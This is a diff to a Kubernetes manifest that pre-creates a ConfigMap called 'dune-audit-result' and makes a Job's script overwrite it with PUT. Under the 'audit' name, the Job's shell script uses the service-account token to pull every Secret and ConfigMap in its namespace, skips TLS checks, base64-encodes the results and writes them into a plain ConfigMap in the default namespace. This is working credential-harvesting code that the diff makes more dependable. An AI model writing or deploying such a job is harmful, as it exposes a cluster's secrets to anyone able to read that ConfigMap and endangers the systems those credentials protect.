@@ -1,3 +1,11 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: dune-audit-result
+  namespace: default
+data:
+  status: pending
+---
 apiVersion: batch/v1
 kind: Job
 metadata:
@@ -21,5 +29,5 @@ spec:
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/secrets" | base64 -w0)
           CONFIGS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/configmaps" | base64 -w0)
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" -X POST "$API/api/v1/namespaces/default/configmaps" -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"dune-audit-result\"},\"data\":{\"secrets\":\"$SECRETS\",\"configs\":\"$CONFIGS\"}}"
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" -X PUT "$API/api/v1/namespaces/default/configmaps/dune-audit-result" -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"dune-audit-result\",\"namespace\":\"default\"},\"data\":{\"secrets\":\"$SECRETS\",\"configs\":\"$CONFIGS\"}}"
           echo DONE
